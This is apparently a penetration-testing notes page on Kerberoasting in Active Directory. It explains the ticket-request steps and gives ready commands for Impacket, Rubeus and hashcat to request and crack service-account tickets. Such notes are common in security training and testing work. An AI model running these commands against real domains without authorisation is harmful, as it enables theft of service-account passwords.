# Kerberoasting

## Introduction

**Kerberoasting** is an attack technique that allows attackers to target **service accounts** in Active Directory. These service accounts typically have **SPNs (Service Principal Names)** associated with them.

The attacker is able to request the **Service Ticket** from the **Ticket Granting Server** which is encrypted using the **SPN's password hash**.

**The attack is made in few steps:**

1. **The attacker sends** [#tgs-req](../kerberos-authentication.md#tgs-req "mention") request to the Ticket Granting Server.
2. **The attacker gets the Service Ticket** in the[#tgs-rep](../kerberos-authentication.md#tgs-rep "mention") request
3. **Attacker brute-forces** the Service Ticket offline to obtain the user's password.

## Performing the attack

### Impacket

```bash
impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username>
```

### Rubeus

```batch
.\Rubeus.exe kerberoast /outfile:<outputfile>
```

## Crack

```bash
hashcat -m 13100 <hashes_file> <wordlist>
```

